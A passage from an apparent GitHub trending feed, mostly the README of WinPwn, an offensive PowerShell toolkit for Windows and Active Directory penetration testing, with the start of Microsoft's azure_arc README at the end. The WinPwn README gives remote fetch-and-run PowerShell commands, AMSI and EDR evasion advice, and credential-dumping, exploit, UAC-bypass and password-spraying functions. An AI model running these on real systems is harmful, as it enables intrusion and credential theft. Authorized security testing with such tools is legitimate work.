    <summary type="html">&lt;p&gt;Automation for internal Windows Penetrationtest / AD-Security&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;a href=&#34;https://blockchain.info/address/1MXReD1F4w5SUXK3phLVJ5M8KrXJHfecmZ&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/Donate-Bitcoin-blue.svg?style=flat&#34; alt=&#34;&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;WinPwn&lt;/h1&gt; &#xA;&lt;p&gt;In many past internal penetration tests I often had problems with the existing Powershell Recon / Exploitation scripts due to missing proxy support. I also often ran the same scripts one after the other to get information about the current system and/or the domain. To automate as many internal penetrationtest processes (reconnaissance as well as exploitation) and for the proxy reason I wrote my own script with automatic proxy recognition and integration. The script is mostly based on well-known large other offensive security Powershell projects.&lt;/p&gt; &#xA;&lt;p&gt;Any suggestions, feedback, Pull requests and comments are welcome!&lt;/p&gt; &#xA;&lt;p&gt;Just Import the Modules with:&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;Import-Module .\WinPwn.ps1&lt;/code&gt; or &lt;code&gt;iex(new-object net.webclient).downloadstring(&#39;https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1&#39;)&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;To bypass AMSI take one of the existing &lt;a href=&#34;https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell&#34;&gt;bypass techniques&lt;/a&gt;, find the AMSI &lt;a href=&#34;https://github.com/RythmStick/AMSITrigger&#34;&gt;trigger&lt;/a&gt; and manually change it in the bypass function or encode the trigger string. Alternatively obfuscate the whole script.&lt;/p&gt; &#xA;&lt;p&gt;To spawn a new protected PowerShell Process that is set to run with BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON process mitigation:&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;iex(new-object net.webclient).downloadstring(&#39;https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/Obfus_SecurePS_WinPwn.ps1&#39;)&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;This prevents non-microsoft DLLs (e.g. AV/EDR products) to load into PowerShell - unless they have a Cross-Signed Microsoft certificate.&lt;/p&gt; &#xA;&lt;p&gt;If you find yourself stuck on a windows system with no internet access - no problem at all, just use &lt;code&gt;Offline_Winpwn.ps1&lt;/code&gt;, the most important scripts and executables are included.&lt;/p&gt; &#xA;&lt;p&gt;Functions available after Import:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;WinPwn&lt;/code&gt; -&amp;gt; Menu to choose attacks:&lt;/h4&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/images/WinPwn.JPG&#34; alt=&#34;alt text&#34;&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;Inveigh&lt;/code&gt; -&amp;gt; Executes Inveigh in a new Console window , SMB-Relay attacks with Session management (Invoke-TheHash) integrated&lt;/h4&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;SessionGopher&lt;/code&gt; -&amp;gt; Executes Sessiongopher Asking you for parameters&lt;/h4&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;Kittielocal&lt;/code&gt; -&amp;gt;&lt;/h4&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Obfuscated Invoke-Mimikatz version&lt;/li&gt; &#xA;   &lt;li&gt;Safetykatz in memory&lt;/li&gt; &#xA;   &lt;li&gt;Dump lsass using rundll32 technique&lt;/li&gt; &#xA;   &lt;li&gt;Download and run obfuscated Lazagne&lt;/li&gt; &#xA;   &lt;li&gt;Dump Browser credentials&lt;/li&gt; &#xA;   &lt;li&gt;Customized Mimikittenz Version&lt;/li&gt; &#xA;   &lt;li&gt;Exfiltrate Wifi-Credentials&lt;/li&gt; &#xA;   &lt;li&gt;Dump SAM-File NTLM Hashes&lt;/li&gt; &#xA;   &lt;li&gt;SharpCloud&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;Localreconmodules&lt;/code&gt; -&amp;gt;&lt;/h4&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Collect installed software, vulnerable software, Shares, network information, groups, privileges and many more&lt;/li&gt; &#xA;   &lt;li&gt;Check typical vulns like SMB-Signing, LLMNR Poisoning, MITM6 , WSUS over HTTP&lt;/li&gt; &#xA;   &lt;li&gt;Checks the Powershell event logs for credentials or other sensitive informations&lt;/li&gt; &#xA;   &lt;li&gt;Collect Browser Credentials and history&lt;/li&gt; &#xA;   &lt;li&gt;Search for passwords in the registry and on the file system&lt;/li&gt; &#xA;   &lt;li&gt;Find sensitive files (config files, RDP files, keepass Databases)&lt;/li&gt; &#xA;   &lt;li&gt;Search for .NET Binaries on the local system&lt;/li&gt; &#xA;   &lt;li&gt;Optional: Get-Computerdetails (Powersploit) and PSRecon&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;Domainreconmodules&lt;/code&gt; -&amp;gt;&lt;/h4&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Collect various domain informations for manual review&lt;/li&gt; &#xA;   &lt;li&gt;Find AD-Passwords in description fields&lt;/li&gt; &#xA;   &lt;li&gt;Search for potential sensitive domain share files&lt;/li&gt; &#xA;   &lt;li&gt;Unconstrained delegation systems/users are enumerated&lt;/li&gt; &#xA;   &lt;li&gt;Generate Bloodhound Report&lt;/li&gt; &#xA;   &lt;li&gt;MS17-10 Scanner for domain systems&lt;/li&gt; &#xA;   &lt;li&gt;Bluekeep Scanner for domain systems&lt;/li&gt; &#xA;   &lt;li&gt;SQL Server discovery and Auditing functions - PowerUpSQL&lt;/li&gt; &#xA;   &lt;li&gt;MS-RPRN Check for Domaincontrollers or all systems&lt;/li&gt; &#xA;   &lt;li&gt;Group Policy Audit with Grouper2&lt;/li&gt; &#xA;   &lt;li&gt;An AD-Report is generated in CSV Files (or XLS if excel is installed) with ADRecon&lt;/li&gt; &#xA;   &lt;li&gt;Check Printers for common vulns&lt;/li&gt; &#xA;   &lt;li&gt;Search for Resource-Based Constrained Delegation attack paths&lt;/li&gt; &#xA;   &lt;li&gt;Check all DCs for zerologon - CVE-2020-1472&lt;/li&gt; &#xA;   &lt;li&gt;And more, just take a look&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;Privescmodules&lt;/code&gt;&lt;/h4&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;itm4ns Invoke-PrivescCheck&lt;/li&gt; &#xA;   &lt;li&gt;winPEAS&lt;/li&gt; &#xA;   &lt;li&gt;Powersploits PowerUp Allchecks, Sherlock, GPPPasswords&lt;/li&gt; &#xA;   &lt;li&gt;Dll Hijacking, File Permissions, Registry permissions and weak keys, Rotten/Juicy Potato Check&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;kernelexploits&lt;/code&gt; -&amp;gt;&lt;/h4&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;MS15-077 - (XP/Vista/Win7/Win8/2000/2003/2008/2012) x86 only!&lt;/li&gt; &#xA;   &lt;li&gt;MS16-032 - (2008/7/8/10/2012)!&lt;/li&gt; &#xA;   &lt;li&gt;MS16-135 - (WS2k16 only)!&lt;/li&gt; &#xA;   &lt;li&gt;CVE-2018-8120 - May 2018, Windows 7 SP1/2008 SP2,2008 R2 SP1!&lt;/li&gt; &#xA;   &lt;li&gt;CVE-2019-0841 - April 2019!&lt;/li&gt; &#xA;   &lt;li&gt;CVE-2019-1069 - Polarbear Hardlink, Credentials needed - June 2019!&lt;/li&gt; &#xA;   &lt;li&gt;CVE-2019-1129/1130 - Race Condition, multiples cores needed - July 2019!&lt;/li&gt; &#xA;   &lt;li&gt;CVE-2019-1215 - September 2019 - x64 only!&lt;/li&gt; &#xA;   &lt;li&gt;CVE-2020-0638 - February 2020 - x64 only!&lt;/li&gt; &#xA;   &lt;li&gt;CVE-2020-0796 - SMBGhost&lt;/li&gt; &#xA;   &lt;li&gt;CVE-2020-0787 - March 2020 - all windows versions&lt;/li&gt; &#xA;   &lt;li&gt;CVE-2021-34527/CVE-2021-1675 - June 2021 - PrintNightmare&lt;/li&gt; &#xA;   &lt;li&gt;CVE-2021-40449 - CallbackHell - October 2021&lt;/li&gt; &#xA;   &lt;li&gt;Juicy-Potato Exploit&lt;/li&gt; &#xA;   &lt;li&gt;itm4ns Printspoofer&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;UACBypass&lt;/code&gt; -&amp;gt;&lt;/h4&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;UAC Magic, Based on James Forshaw&#39;s three part post on UAC&lt;/li&gt; &#xA;   &lt;li&gt;UAC Bypass cmstp technique, by Oddvar Moe&lt;/li&gt; &#xA;   &lt;li&gt;DiskCleanup UAC Bypass, by James Forshaw&lt;/li&gt; &#xA;   &lt;li&gt;DccwBypassUAC technique, by Ernesto Fernandez and Thomas Vanhoutte&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;SYSTEMShell&lt;/code&gt; -&amp;gt;&lt;/h4&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Pop System Shell using CreateProcess&lt;/li&gt; &#xA;   &lt;li&gt;Pop System Shell using NamedPipe Impersonation&lt;/li&gt; &#xA;   &lt;li&gt;Pop System Shell using Token Manipulation&lt;/li&gt; &#xA;   &lt;li&gt;Bind System Shell using UsoClient DLL load or CreateProcess&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;Shareenumeration&lt;/code&gt; -&amp;gt; Invoke-Filefinder and Invoke-Sharefinder (Powerview / Powersploit)&lt;/h4&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;Domainshares&lt;/code&gt; -&amp;gt; Snaffler or Passhunt search over all domain systems&lt;/h4&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;Groupsearch&lt;/code&gt; -&amp;gt; Get-DomainGPOUserLocalGroupMapping - find Systems where you have Admin-access or RDP access to via Group Policy Mapping (Powerview / Powersploit)&lt;/h4&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;Kerberoasting&lt;/code&gt; -&amp;gt; Executes Invoke-Kerberoast in a new window and stores the hashes for later cracking&lt;/h4&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;PowerSQL&lt;/code&gt; -&amp;gt; SQL Server discovery, Check access with current user, Audit for default credentials + UNCPath Injection Attacks&lt;/h4&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;Sharphound&lt;/code&gt; -&amp;gt; Bloodhound 3.0 Report&lt;/h4&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;Adidnsmenu&lt;/code&gt; -&amp;gt; Create Active Directory-Integrated DNS Nodes or remove them&lt;/h4&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;MS17-10&lt;/code&gt; -&amp;gt; Scan active windows Servers in the domain or all systems for MS17-10 (Eternalblue) vulnerability&lt;/h4&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;Sharpcradle&lt;/code&gt; -&amp;gt; Load C# Files from a remote Webserver to RAM&lt;/h4&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;DomainPassSpray&lt;/code&gt; -&amp;gt; DomainPasswordSpray Attacks, one password for all domain users&lt;/h4&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;Bluekeep&lt;/code&gt; -&amp;gt; Bluekeep Scanner for domain systems&lt;/h4&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Without parameters, most of the functions can only be used from an interactive shell. So i decided to add the parameters &lt;code&gt;-noninteractive&lt;/code&gt; and &lt;code&gt;-consoleoutput&lt;/code&gt; to make the script usable from an asynchronous C2-Framework like Empire, Covenant, Cobalt Strike or others. Additionally the &lt;code&gt;-repo&lt;/code&gt; parameter was added to use WinPwn with all its features from a local repository. They can be used as follows:&lt;/p&gt; &#xA;&lt;p&gt;Usage:&lt;/p&gt; &#xA;&lt;p&gt;-noninteractive -&amp;gt; No questions for functions so that they run with predefined or user defined parameters&lt;/p&gt; &#xA;&lt;p&gt;-consoleoutput -&amp;gt; The loot/report folders are not created. Every function returns the output to the console so that you can take a look at everything in the Agent logs of your C2-Framework Examples:&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;WinPwn -noninteractive -consoleoutput -DomainRecon&lt;/code&gt; -&amp;gt; This will return every single domain recon script and function and will probably give you really much output&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;WinPwn -noninteractive -consoleoutput -Localrecon&lt;/code&gt; -&amp;gt; This will enumerate as much information for the local system as possible&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;Generalrecon -noninteractive&lt;/code&gt; -&amp;gt; Execute basic local recon functions and store the output in the corresponding folders&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;UACBypass -noninteractive -command &#34;C:\temp\stager.exe&#34; -technique ccmstp&lt;/code&gt; -&amp;gt; Execute a stager in a high integrity process from a low privileged session&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;Kittielocal -noninteractive -consoleoutput -browsercredentials&lt;/code&gt; -&amp;gt; Dump Browser-Credentials via Sharpweb returning the output to console&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;Kittielocal -noninteractive -browsercredentials&lt;/code&gt; -&amp;gt; Dump SAM File NTLM-Hashes and store the output in a file&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;WinPwn -PowerSharpPack -consoleoutput -noninteractive&lt;/code&gt; -&amp;gt; Execute Seatbelt, PowerUp, Watson and more C# binaries in memory&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;Dotnetsearch -consoleoutput -noninteractive&lt;/code&gt; -&amp;gt; Search in &lt;code&gt;C:\Program Files\&lt;/code&gt; and &lt;code&gt;C:\Program Files (x86)\&lt;/code&gt; for .NET assemblies&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;WinPwn -repo http://192.168.1.10:8000/WinPwn_Repo&lt;/code&gt; -&amp;gt; Use a local webserver as offline repo to use WinPwn without internet access&lt;/p&gt; &#xA;&lt;p&gt;Get_WinPwn_Repo.sh:&lt;/p&gt; &#xA;&lt;p&gt;Usage: ./Get_WinPwn_Repo.sh {Option}&lt;/p&gt; &#xA;&lt;p&gt;Example: ./Get_WinPwn_Repo.sh --install&lt;/p&gt; &#xA;&lt;p&gt;Options: --install Download the repository and place it to ./WinPwn_Repo/ --remove Remove the repository ./WinPwn_Repo/ --reinstall Remove the repository and download a new one to ./WinPwn_Repo/ --start-server Start a python HTTP server on port 8000 --help Show this help&lt;/p&gt; &#xA;&lt;h2&gt;TO-DO&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Some obfuskation&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; More obfuscation&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; Proxy via PAC-File support&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Get the scripts from my own creds repository (&lt;a href=&#34;https://github.com/S3cur3Th1sSh1t/Creds&#34;&gt;https://github.com/S3cur3Th1sSh1t/Creds&lt;/a&gt;) to be independent from changes in the original repositories&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; More Recon/Exploitation functions&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Add menu for better handling of functions&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Amsi Bypass&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Block ETW&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;CREDITS&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/Kevin-Robertson/&#34;&gt;Kevin-Robertson&lt;/a&gt; - Inveigh, Powermad, Invoke-TheHash&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/Arvanaghi/&#34;&gt;Arvanaghi&lt;/a&gt; - SessionGopher&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/PowerShellMafia/&#34;&gt;PowerShellMafia&lt;/a&gt; - Powersploit&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/Dionach/&#34;&gt;Dionach&lt;/a&gt; - PassHunt&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/A-mIn3/&#34;&gt;A-mIn3&lt;/a&gt; - WINSpect&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/411Hall/&#34;&gt;411Hall&lt;/a&gt; - JAWS&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/sense-of-security/&#34;&gt;sense-of-security&lt;/a&gt; - ADrecon&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/dafthack/&#34;&gt;dafthack&lt;/a&gt; - DomainPasswordSpray&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/rasta-mouse/&#34;&gt;rasta-mouse&lt;/a&gt; - Sherlock, Amsi Bypass, PPID Spoof &amp;amp; BlockDLLs&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/AlessandroZ/&#34;&gt;AlessandroZ&lt;/a&gt; - LaZagne&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/samratashok/&#34;&gt;samratashok&lt;/a&gt; - nishang&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/leechristensen/&#34;&gt;leechristensen&lt;/a&gt; - Random Repo, Spoolsample, other ps1 scripts&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/HarmJ0y&#34;&gt;HarmJ0y&lt;/a&gt; - Many good Blogposts, Gists and Scripts, all Ghostpack binaries&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/NetSPI/&#34;&gt;NETSPI&lt;/a&gt; - PowerUpSQL&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/Cn33liz/&#34;&gt;Cn33liz&lt;/a&gt; - p0wnedShell&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/rasta-mouse/&#34;&gt;rasta-mouse&lt;/a&gt; - AmsiScanBufferBypass&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/l0ss/&#34;&gt;l0ss&lt;/a&gt; - Grouper2&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/dafthack/&#34;&gt;dafthack&lt;/a&gt; - DomainPasswordSpray&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/enjoiz/Privesc&#34;&gt;enjoiz&lt;/a&gt; - PrivEsc&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/itm4n&#34;&gt;itm4n&lt;/a&gt; - Invoke-PrivescCheck &amp;amp; PrintSpoofer&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/tyranid&#34;&gt;James Forshaw&lt;/a&gt; - UACBypasses&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/api0cradle&#34;&gt;Oddvar Moe&lt;/a&gt; - UACBypass&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS&#34;&gt;Carlos Polop&lt;/a&gt; - winPEAS&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/gentilkiwi&#34;&gt;gentilkiwi&lt;/a&gt; - Mimikatz, Kekeo&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/hlldz&#34;&gt;hlldz&lt;/a&gt; - Invoke-Phantom&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/mattifestation&#34;&gt;Matthew Graeber&lt;/a&gt; - many Ps1 Scripts which are nearly used everywhere&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/rvrsh3ll/&#34;&gt;Steve Borosh&lt;/a&gt; - Misc-Powershell-Scripts, SharpPrinter, SharpSSDP&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://twitter.com/PyroTek3&#34;&gt;Sean Metcalf&lt;/a&gt; - SPN-Scan + many usefull articles @adsecurity.org&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/SnaffCon/Snaffler&#34;&gt;@l0ss and @Sh3r4&lt;/a&gt; - Snaffler&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/FSecureLABS&#34;&gt;FSecureLABS&lt;/a&gt; - GPO Tools&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/vletoux&#34;&gt;vletoux&lt;/a&gt; - PingCastle Scanners&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/BC-SECURITY/Invoke-ZeroLogon&#34;&gt;NCCGroup + BC-Security&lt;/a&gt; - ZeroLogon Scanner&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/BloodHoundAD&#34;&gt;All people working on Bloodhound&lt;/a&gt; - SharpHound Collector&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/klezVirus&#34;&gt;klezVirus&lt;/a&gt; - SharpLdapRelayScan&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/cube0x0&#34;&gt;cube0x0&lt;/a&gt; - LdapSignCheck + other toolings&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://twitter.com/s4ntiago_p&#34;&gt;@s4ntiago_p&lt;/a&gt; - NanoDump&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://twitter.com/thefLinkk&#34;&gt;@thefLinkk&lt;/a&gt; - Handlekatz&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/search?q=infosec&#34;&gt;Many more people in the Community&lt;/a&gt; - I&#39;m sure, that I&#39;ve forgotten many other invididuals who indirectly contributed into this Script&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Stargazers over time&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://starchart.cc/S3cur3Th1sSh1t/WinPwn&#34;&gt;&lt;img src=&#34;https://starchart.cc/S3cur3Th1sSh1t/WinPwn.svg?sanitize=true&#34; alt=&#34;Stargazers over time&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Legal disclaimer:&lt;/h2&gt; &#xA;&lt;p&gt;Usage of WinPwn for attacking targets without prior mutual consent is illegal. It&#39;s the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>microsoft/azure_arc</title>
    <updated>2022-06-01T01:50:46Z</updated>
    <id>tag:github.com,2022-06-01:/microsoft/azure_arc</id>
    <link href="https://github.com/microsoft/azure_arc" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Automated Azure Arc environments&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Azure Arc Jumpstart documentation&lt;/h1&gt; &#xA;&lt;p&gt;If you are looking to explore the Jumpstart documentation, please go to the documentation website:&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://azurearcjumpstart.io&#34;&gt;https://azurearcjumpstart.io&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;This repository contains the markdown files which generate the above website. See below for guidance on running with a local environment to contribute to the docs.&lt;/p&gt; &#xA;&lt;h2&gt;Want to help and contribute?&lt;/h2&gt; &#xA;&lt;p&gt;Before making your first contribution, make sure to review the &lt;a href=&#34;https://azurearcjumpstart.io/contributing/&#34;&gt;contributing&lt;/a&gt; section in the docs.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Found a bug?! Use the &lt;a href=&#34;https://github.com/microsoft/azure_arc/issues/new?assignees=&amp;amp;labels=bug&amp;amp;template=bug_report.md&amp;amp;title=&#34;&gt;Bug Report&lt;/a&gt; issue template to let us know.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;To ask for a Jumpstart scenario, create one yourself or submit an Azure Arc core product feature request, use the &lt;a href=&#34;https://github.com/microsoft/azure_arc/issues/new?assignees=&amp;amp;labels=&amp;amp;template=feature_request.md&amp;amp;title=&#34;&gt;Feature Request&lt;/a&gt; issue template.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;This project welcomes contributions and suggestions. Most contributions require you to agree to a Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us the rights to use your contribution. For details, visit &lt;a href=&#34;https://cla.opensource.microsoft.com&#34;&gt;https://cla.opensource.microsoft.com&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;When you submit a pull request, a CLA bot will automatically determine whether you need to provide a CLA and decorate the PR appropriately (e.g., status check, comment). Simply follow the instructions provided by the bot. You will only need to do this once across all repos using our CLA.&lt;/p&gt; &#xA;&lt;p&gt;This project has adopted the &lt;a href=&#34;https://opensource.microsoft.com/codeofconduct/&#34;&gt;Microsoft Open Source Code of Conduct&lt;/a&gt;. For more information see the &lt;a href=&#34;https://opensource.microsoft.com/codeofconduct/faq/&#34;&gt;Code of Conduct FAQ&lt;/a&gt; or contact &lt;a href=&#34;mailto:opencode@microsoft.com&#34;&gt;opencode@microsoft.com&lt;/a&gt; with any additional questions or comments.&lt;/p&gt; &#xA;&lt;h2&gt;Jumpstart Roadmap&lt;/h2&gt; &#xA;&lt;p&gt;Up-to-date roadmap for the Azure Arc Jumpstart scenarios can be found under &lt;a href=&#34;https://github.com/microsoft/azure_arc/projects/1&#34;&gt;the repository GitHub Project&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Legal Notices&lt;/h2&gt; &#xA;&lt;p&gt;Microsoft and any contributors grant you a license to the Microsoft documentation and other content in this repository under the &lt;a href=&#34;https://creativecommons.org/licenses/by/4.0/legalcode&#34;&gt;Creative Commons Attribution 